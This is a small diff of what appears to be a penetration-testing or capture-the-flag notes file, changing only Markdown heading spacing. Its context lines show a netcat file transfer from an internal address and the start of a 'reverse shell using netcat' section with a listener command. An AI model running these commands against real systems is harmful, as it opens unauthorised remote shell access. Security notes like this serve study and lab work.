@@ -721,8 +721,8 @@ nc 172.16.40.10 1111 > 3steg.jpg
 
 
 
-#REVERSE SHELL USING NETCAT
-##First listen for the shell on your device.
+# REVERSE SHELL USING NETCAT
+## First listen for the shell on your device.
 ```
 $ nc -lvp 9999
 ```
